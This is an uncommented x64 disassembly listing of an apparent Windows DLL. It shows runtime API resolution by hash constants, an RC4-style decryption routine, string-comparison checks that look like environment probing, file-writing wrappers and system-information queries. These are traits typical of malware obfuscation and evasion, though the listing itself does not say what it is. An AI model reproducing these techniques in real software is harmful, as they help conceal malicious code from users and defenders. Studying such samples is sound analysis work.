mov r8d 0x8593dd7
mov edx ebp
xor ecx ecx
mov edi r14d
call sub_18000365c
lea r8 [ rw-data ]
lea rcx [ rw-data ]
xor r9d r9d
mov edx ebx
mov [ rsp + 0x20 ] r14d
call rax
mov r9d 0x1ce
mov r8d 0xbe618d3e
mov edx ebp
xor ecx ecx
mov r13 rax
call sub_18000365c
mov [ rsp + 0x38 ] r14d
xor r9d r9d
mov [ rsp + 0x30 ] r14d
lea rdx [ rw-data ]
lea r8d [ r9 + 0x50 ]
mov rcx r13
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] r14d
call rax
lea rcx [ rw-data ]
mov r12 rax
call sub_180005420
test eax eax
je r-xdata
mov edi 0x1
lea rdx [ r--data ]
mov r8d edi
mov rcx rbx
call sub_180003fe4
mov edi r14d
test eax eax
jne r-xdata
lea r8 [ r--data ]
lea rdx [ rw-data ]
lea rcx [ rw-data ]
call sub_18000574c
mov r8d 0x1
lea rdx [ r--data ]
mov rbx rax
mov rcx rax
test edi edi
jne r-xdata
lea rdx [ rw-data ]
mov ecx 0x104
call sub_180004ac4
mov rcx rbx
call sub_1800042fc
cmp [ rw-data ] r14b
je r-xdata
call sub_180006338
mov rcx rbx
mov edi eax
call sub_1800042fc
lea rdx [ r--data ]
sub_180005324
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov al [ rsp + 0xe8 ]
mov r10 r9
mov r9 [ rsp + 0xa0 ]
mov [ rsp + 0x60 ] al
mov rax [ rsp + 0xe0 ]
mov r11d r8d
mov [ rsp + 0x58 ] rax
mov rax [ rsp + 0xd8 ]
mov rbx rdx
mov [ rsp + 0x50 ] rax
mov rax [ rsp + 0xd0 ]
mov esi ecx
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0xc8 ]
mov r8 r10
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0xc0 ]
mov edx r11d
mov [ rsp + 0x38 ] rax
mov rax [ rsp + 0xb8 ]
mov rcx rbx
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0xb0 ]
xor dil dil
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
call sub_18000474c
test al al
je r-xdata
lea r11 [ rsp + 0x70 ]
mov al dil
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
lea rdx [ sub_180004fd0 ]
xor r8d r8d
mov ecx esi
call sub_180003f94
mov dil al
sub_18000543c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x120
mov r13 rcx
mov rbx r8
mov rbp rdx
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0xff
mov r14b r9b
mov [ rsp + 0x20 ] 0x0
call sub_1800017b8
mov ecx 0x34
xor sil sil
xor dil dil
call sub_1800042d8
mov r8d 0x32
mov rdx rbx
mov rcx rax
mov r12 rax
call sub_180003fa4
mov cl [ r13 + rbp - 0x2 ]
mov [ r12 + 0x32 ] cl
mov cl [ r13 + rbp - 0x1 ]
mov [ r12 + 0x33 ] cl
movzx ecx dil
mov [ rsp + rcx + 0x20 ] dil
inc dil
jne r-xdata
mov ebx 0x800000ff
inc dil
movzx ecx sil
mov al [ rsp + rcx + 0x20 ]
mov [ rsp + r8 + 0x20 ] al
mov [ rsp + rcx + 0x20 ] r9b
jne r-xdata
dec esi
or esi 0xffffff00
inc esi
movzx ecx dil
mov eax 0x4ec4ec4f
movzx esi sil
movzx r8d dil
imul ecx
sar edx 0x4
movzx r9d [ rsp + r8 + 0x20 ]
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x34
sub ecx edx
movsxd rax ecx
movzx ecx [ rax + r12 ]
add ecx r9d
add esi ecx
and esi ebx
jge r-xdata
mov rcx r12
call sub_1800042fc
mov rcx rbp
test r14b r14b
jne r-xdata
call sub_1800042d8
xor r8b r8b
xor r10d r10d
mov r11 rax
mov r9 rax
sub r13 rax
lea rsi [ rbp - 0x3 ]
lea rcx [ rbp - 0x1 ]
movzx r8d r8b
movzx edx dil
movzx ebx [ rsp + rdx + 0x20 ]
add r8d ebx
and r8d 0x800000ff
jge r-xdata
dec edi
or edi 0xffffff00
inc edi
movzx ecx r8b
movzx eax [ rsp + rcx + 0x20 ]
mov [ rsp + rcx + 0x20 ] bl
mov ebx 0x800000ff
mov [ rsp + rdx + 0x20 ] al
movzx edx [ rsp + rcx + 0x20 ]
add edx eax
and edx ebx
jge r-xdata
dec r8d
or r8d 0xffffff00
inc r8d
movsxd rax edx
inc r10d
mov cl [ rsp + rax + 0x20 ]
mov eax r10d
xor cl [ r13 + r9 ]
mov [ r9 ] cl
inc r9
cmp rax rsi
jbe r-xdata
dec edx
or edx 0xffffff00
inc edx
movzx edi dil
inc edi
and edi ebx
jge r-xdata
mov [ r11 + rbp - 0x2 ] 0x0
mov rax r11
lea r11 [ rsp + 0x120 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
sub_180005604
xor eax eax
mov rdx rcx
test rcx rcx
je r-xdata
retn
mov r8b [ rcx ]
jmp r-xdata
test r8b r8b
jne r-xdata
lea ecx [ rax + rax * 4 ]
movsx eax r8b
inc rdx
mov r8b [ rdx ]
lea eax [ rax + rcx * 2 - 0x30 ]
sub_18000562c
test rcx rcx
jne r-xdata
mov al [ rcx ]
test al al
jne r-xdata
xor eax eax
retn
cmp al dl
je r-xdata
jmp r-xdata
mov rax rcx
retn
inc rcx
sub_180005648
xor r10d r10d
test rcx rcx
je r-xdata
xor al al
retn
test rdx rdx
je r-xdata
mov al [ rcx ]
mov r8 rcx
test al al
je r-xdata
sub r8d ecx
mov r9 rdx
cmp [ rdx ] r10b
je r-xdata
inc r8
cmp [ r8 ] r10b
jne r-xdata
sub r9d edx
cmp r8d r9d
jne r-xdata
inc r9
cmp [ r9 ] r10b
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
sub rdx rcx
inc rcx
mov al [ rcx ]
test al al
jne r-xdata
cmp al [ rdx + rcx ]
jne r-xdata
sub_18000569c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor ebx ebx
mov rdi rcx
test rcx rcx
jne r-xdata
mov rax rcx
cmp [ rcx ] bl
je r-xdata
mov eax ebx
jmp r-xdata
sub eax ecx
inc rax
cmp [ rax ] bl
jne r-xdata
lea ecx [ rax + 0x1 ]
call sub_1800042d8
mov rsi rax
test rdi rdi
je r-xdata
mov r8d ebx
mov rdx rdi
mov rcx rsi
call sub_180003fa4
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax rdi
cmp [ rdi ] bl
je r-xdata
sub eax edi
mov ebx eax
inc rax
cmp [ rax ] bl
jne r-xdata
sub_18000570c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
lea ecx [ rdx + 0x1 ]
mov edi edx
call sub_1800042d8
mov r8d edi
mov rdx rsi
mov rcx rax
mov rbx rax
call sub_180003fa4
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000574c
mov rax rsp
mov [ rax + 0x8 ] rcx
mov [ rax + 0x10 ] rdx
mov [ rax + 0x18 ] r8
mov [ rax + 0x20 ] r9
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
cmp [ rcx ] 0x0
mov rax rcx
je r-xdata
sub eax ecx
je r-xdata
inc rax
cmp [ rax ] 0x0
jne r-xdata
xor edi edi
lea rbp [ rsp + 0x68 ]
add rbp 0xfffffffffffffff8
lea esi [ rdi + 0x1 ]
add rbp 0x8
lea rdx [ r--data ]
mov rbx [ rbp ]
mov rcx rbx
call sub_180005648
test al al
je r-xdata
cmp [ rbx ] 0x0
mov rax rbx
je r-xdata
test rbx rbx
je r-xdata
mov rax rdi
jmp r-xdata
sub eax ebx
mov rcx rdi
lea edx [ rax + rsi ]
call sub_180004418
cmp [ rbx ] 0x0
mov rdx rbx
mov rdi rax
je r-xdata
inc rax
cmp [ rax ] 0x0
jne r-xdata
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub edx ebx
mov eax esi
mov r8d edx
lea rcx [ rax + rdi - 0x1 ]
mov rdx rbx
call sub_180003fa4
cmp [ rbx ] 0x0
mov r11 rbx
je r-xdata
inc rdx
cmp [ rdx ] 0x0
jne r-xdata
sub r11d ebx
add esi r11d
inc r11
cmp [ r11 ] 0x0
jne r-xdata
sub_180005824
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
call sub_1800042fc
sub_180005858
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180005824
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_1800042fc
sub_180005888
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
xor esi esi
mov rbx rcx
mov [ rcx ] rax
cmp [ rcx + 0x10 ] esi
jbe r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
xor edi edi
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x10 ] 0x0
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180005824
call sub_1800042fc
inc esi
add rdi 0x8
cmp esi [ rbx + 0x10 ]
jb r-xdata
mov rcx [ rcx + rdi ]
call sub_1800042fc
mov rcx [ rbx + 0x8 ]
cmp [ rcx + rdi ] 0x0
je r-xdata
sub_1800058fc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180005888
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_1800042fc
sub_18000592c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rdx rdx
je r-xdata
xor al al
cmp [ rdx ] 0x0
mov rax rdx
je r-xdata
sub eax edx
je r-xdata
inc rax
cmp [ rax ] 0x0
jne r-xdata
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
mov ecx 0x8
call sub_1800042d8
mov edx [ rdi + 0x10 ]
test edx edx
je r-xdata
sub eax ebx
lea ecx [ rax + 0x1 ]
call sub_1800042d8
cmp [ rbx ] 0x0
mov rcx rbx
mov [ rsp + 0x38 ] rax
je r-xdata
inc rax
cmp [ rax ] 0x0
jne r-xdata
lea edx [ rdx * 8 + 0x8 ]
call sub_180004418
jmp r-xdata
sub ecx ebx
mov rdx rbx
mov r8d ecx
mov rcx rax
call sub_180001748
mov edx [ rdi + 0x10 ]
mov rcx [ rdi + 0x8 ]
lea rcx [ rcx + rdx * 8 ]
lea rdx [ rsp + 0x38 ]
mov r8d 0x8
call sub_180001748
inc [ rdi + 0x10 ]
mov al 0x1
jmp r-xdata
inc rcx
cmp [ rcx ] 0x0
jne r-xdata
mov [ rdi + 0x8 ] rax
cmp [ rbx ] 0x0
mov rax rbx
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800059f8
mov [ rsp + 0x8 ] rbx
xor ebx ebx
mov r11b r8b
mov r10d edx
mov r9 rcx
test rcx rcx
jne r-xdata
movzx ecx [ rcx ]
mov edx ebx
mov r8d ebx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
test cx cx
jne r-xdata
mov rbx [ rsp + 0x8 ]
retn
test r10d r10d
je r-xdata
mov eax edx
test r11b r11b
je r-xdata
cmp r8d r10d
jae r-xdata
rol edx 0x7
movzx ecx cx
add r9 0x2
xor edx ecx
movzx ecx [ r9 ]
inc r8d
lea eax [ rcx - 0x41 ]
cmp ax 0x19
ja r-xdata
add cx 0x20
sub_180005a58
mov r11b r8b
mov r10d edx
mov r9 rcx
test rcx rcx
jne r-xdata
mov cl [ rcx ]
xor edx edx
xor r8d r8d
jmp r-xdata
or eax 0xffffffff
retn
test cl cl
jne r-xdata
test r10d r10d
je r-xdata
mov eax edx
retn
test r11b r11b
je r-xdata
cmp r8d r10d
jae r-xdata
rol edx 0x7
movsx ecx cl
inc r9
xor edx ecx
mov cl [ r9 ]
inc r8d
lea eax [ rcx - 0x41 ]
cmp al 0x19
ja r-xdata
add cl 0x20
sub_180005aa4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rbx rcx
cmp [ rcx + 0x10 ] esi
jbe r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
xor edi edi
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x10 ] 0x0
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
call sub_1800042fc
mov rcx [ rbx + 0x8 ]
cmp [ rcx + rdi ] 0x0
je r-xdata
mov rcx [ rcx ]
call sub_1800042fc
inc esi
add rdi 0x8
cmp esi [ rbx + 0x10 ]
jb r-xdata
mov rcx [ rcx + rdi ]
call sub_1800042fc
mov rax [ rbx + 0x8 ]
mov rcx [ rdi + rax ]
cmp [ rcx ] 0x0
je r-xdata
sub_180005b28
mov [ rsp + 0x10 ] rdx
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
mov ecx 0x8
call sub_1800042d8
mov edx [ rbx + 0x10 ]
test edx edx
je r-xdata
lea edx [ rdx * 8 + 0x8 ]
call sub_180004418
jmp r-xdata
mov ecx [ rbx + 0x10 ]
lea rdx [ rsp + 0x38 ]
mov r8d 0x8
lea rcx [ rax + rcx * 8 ]
mov [ rbx + 0x8 ] rax
call sub_180003fa4
inc [ rbx + 0x10 ]
mov al 0x1
add rsp 0x20
pop rbx
retn
sub_180005b84
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x40
mov r14 rcx
mov edi 0x14
mov rbp r9
mov ecx edi
mov r12d r8d
mov r13d edx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8d r12d
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov edx r13d
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x80 ]
mov rcx r14
mov [ rsp + 0x20 ] eax
call rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
retn
lea ecx [ rdi - 0x13 ]
call sub_1800027f8
mov ecx edi
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x14
call sub_180003410
sub_180005c80
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r14 rcx
mov ecx 0x16
mov rbp r9
mov r12d r8d
mov r13 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x70 ]
mov r9 rbp
mov r8d r12d
mov rdx r13
mov rcx r14
mov [ rsp + 0x20 ] rax
call rbx
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0xd ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x16
call sub_180003410
sub_180005d64
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r14 rcx
mov ecx 0x1a
mov rbp r9
mov r12d r8d
mov r13 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x70 ]
mov r9 rbp
mov r8d r12d
mov rdx r13
mov rcx r14
mov [ rsp + 0x20 ] rax
call rbx
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0xe ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x1a
call sub_180003410
sub_180005e48
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov r13 rcx
mov ecx 0x56
mov ebp r8d
mov r12 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov r8d ebp
mov rdx r12
mov rcx r13
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x15 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x56
call sub_180003410
sub_180005f14
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14d ecx
mov ecx 0x1a2
mov rbp r9
mov r12d r8d
mov r13 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov r9 rbp
mov r8d r12d
mov rdx r13
mov ecx r14d
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
jmp rax
lea ecx [ rax + 0x5 ]
call sub_1800027f8
lea ecx [ rbx + 0x6f ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x1a2
call sub_180003410
sub_180005ff0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x20
xor eax eax
lea rcx [ r--data ]
mov [ rbp + 0x20 ] 0x0
mov [ rbp + 0x21 ] eax
mov [ rbp + 0x25 ] al
mov [ rbp + 0x28 ] al
mov [ rbp + 0x29 ] eax
mov [ rbp + 0x2d ] al
call sub_180005420
lea r12 [ r--data ]
lea rcx [ r--data ]
xor r9d r9d
mov edx eax
mov r8 r12
call sub_18000543c
lea rcx [ r--data ]
mov rdi rax
call sub_180005420
lea rcx [ r--data ]
xor r9d r9d
mov r8 r12
mov edx eax
call sub_18000543c
mov esi 0x6
lea rdx [ rbp + 0x20 ]
mov r8d esi
mov rcx rdi
mov rbx rax
call sub_180005e48
lea rdx [ rbp + 0x28 ]
mov r8d esi
mov rcx rbx
call sub_180005e48
mov rcx rdi
call sub_1800042fc
mov rcx rbx
call sub_1800042fc
lea rcx [ r--data ]
xor bl bl
call sub_180005420
lea rcx [ r--data ]
xor r9d r9d
mov edx eax
mov r8 r12
call sub_18000543c
lea rcx [ r--data ]
mov rsi rax
call sub_180005420
lea rcx [ r--data ]
xor r9d r9d
mov r8 r12
mov edx eax
call sub_18000543c
lea rcx [ r--data ]
mov rdi rax
call sub_180005420
lea rcx [ r--data ]
xor r9d r9d
mov r8 r12
mov edx eax
call sub_18000543c
lea rcx [ rbp + 0x20 ]
mov rdx rsi
mov r12 rax
call sub_180005648
test al al
jne r-xdata
mov bl 0x1
lea rcx [ rbp + 0x20 ]
mov rdx rdi
call sub_180005648
test al al
je r-xdata
mov rcx rsi
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rcx r12
call sub_1800042fc
mov rsi [ rsp + 0x58 ]
mov al bl
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rbp
retn
lea rcx [ rbp + 0x28 ]
mov rdx rsi
call sub_180005648
test al al
jne r-xdata
lea rcx [ rbp + 0x20 ]
mov rdx r12
call sub_180005648
test al al
je r-xdata
mov bl 0x1
lea rcx [ rbp + 0x28 ]
mov rdx rdi
call sub_180005648
test al al
je r-xdata
sub_180006188
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
xor ebp ebp
mov r12 rcx
test rcx rcx
jne r-xdata
call sub_180005ff0
test al al
je r-xdata
xor al al
jmp r-xdata
mov ecx 0x1
call sub_1800027f8
mov ecx 0xc
mov rsi rax
call sub_180002b38
mov edx 0x1
lea r9d [ rdx + 0x2a ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
lea rdx [ rsp + 0x40 ]
mov rcx r12
mov [ rsp + 0x40 ] ebp
call rbx
neg al
sbb ecx ecx
and ecx [ rsp + 0x40 ]
sete al
sub_180006250
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi ecx
mov edi 0x8000
xor eax eax
xor r9d r9d
mov r8d edi
mov rdx rax
mov ecx esi
call sub_180005f14
cmp eax 0xc0000004
jne r-xdata
test eax eax
jne r-xdata
mov rcx rbx
call sub_1800042fc
add edi edi
jmp r-xdata
mov rcx rbx
call sub_1800042fc
mov rax rbx
jmp r-xdata
mov ecx edi
call sub_1800042d8
mov rbx rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_1800062bc
push rbx
sub rsp 0x160
and [ rsp + 0x20 ] 0x0
mov rbx rcx
lea rcx [ rsp + 0x24 ]
xor edx edx
mov r8d 0x13c
call sub_1800017b8
mov edx 0x1
xor ecx ecx
mov r9d 0x89
mov r8d 0x32432444
call sub_18000365c
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call rax
mov rbx rax
cmp rax 0xffffffffffffffff
je r-xdata
xor al al
mov edx 0x1
xor ecx ecx
mov r9d 0x8d
mov r8d 0x7b4842c1
call sub_18000365c
mov rcx rbx
call rax
mov al 0x1
jmp r-xdata
add rsp 0x160
pop rbx
retn
sub_180006338
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov edi r8d
mov rsi rdx
test rcx rcx
jne r-xdata
and [ rsp + 0x30 ] 0x0
xor r9d r9d
mov edx 0x40000000
lea r8d [ r9 + 0x1 ]
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x2
call sub_180005b84
mov rbx rax
cmp rax 0xffffffffffffffff
je r-xdata
xor eax eax
jmp r-xdata
and [ rsp + 0x50 ] 0x0
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov rcx rbx
call sub_1800037b8
mov eax [ rsp + 0x50 ]
test edi edi
je r-xdata
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x50 ]
mov r8d edi
mov rdx rsi
mov rcx rax
call sub_180005c80
sub_1800063cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
and [ rdx ] 0x0
mov rbx rdx
test rcx rcx
jne r-xdata
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
xor r9d r9d
xor r8d r8d
mov edx 0x80000000
mov [ rsp + 0x20 ] 0x3
call sub_180005b84
mov rdi rax
cmp rax 0xffffffffffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov edx 0x1
xor ecx ecx
mov r8d 0xaef7cbf1
lea r9d [ rdx + 0x24 ]
call sub_18000365c
xor edx edx
mov rcx rdi
call rax
mov rsi rax
lea ecx [ rax + 0x1 ]
call sub_1800042d8
mov rbp rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov rcx rdi
call sub_1800037b8
cmp esi [ rbx ]
je r-xdata
test esi esi
je r-xdata
mov rax rbp
and [ rbx ] 0x0
jmp r-xdata
and [ rsp + 0x20 ] 0x0
mov r9 rbx
mov r8d esi
mov rdx rax
mov rcx rdi
call sub_180005d64
sub_180006498
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor ebx ebx
lea rdi [ rw-data ]
mov edx 0x1
mov r8d 0x69260152
xor ecx ecx
lea r9d [ rdx + 0x6c ]
call sub_18000365c
call rax
mov ecx ebx
mov [ rdi ] eax
call sub_180004a10
add ebx 0x3
add rdi 0x4
cmp ebx 0x30
jl r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800064e4
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
mov r8d [ rw-data ]
lea r11 [ rw-data ]
mov ecx [ r11 + r8 * 4 ]
lea eax [ r8 - 0x3 ]
and eax 0xf
lea r10d [ rcx + rcx ]
xor r10d [ r11 + rax * 4 ]
shl r10d 0xf
xor r10d [ r11 + rax * 4 ]
lea eax [ r8 - 0x7 ]
and eax 0xf
xor r10d ecx
mov r9d [ r11 + rax * 4 ]
mov eax r9d
shr eax 0xb
xor r9d eax
mov eax r10d
xor eax r9d
shl r9d 0xa
mov [ r11 + r8 * 4 ] eax
xor r9d r10d
mov edx eax
shl r9d 0x10
and edx 0xfed22169
shl edx 0x5
xor edx eax
lea eax [ r8 - 0x1 ]
and eax 0xf
mov [ rw-data ] eax
xor r9d [ r11 + rax * 4 ]
shl r9d 0x2
xor r9d edx
xor r9d r10d
xor r9d [ r11 + rax * 4 ]
mov [ r11 + rax * 4 ] r9d
mov eax r9d
add rsp 0x28
retn
call sub_180006498
sub_180006584
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov ebx ecx
cmp edx ecx
jne r-xdata
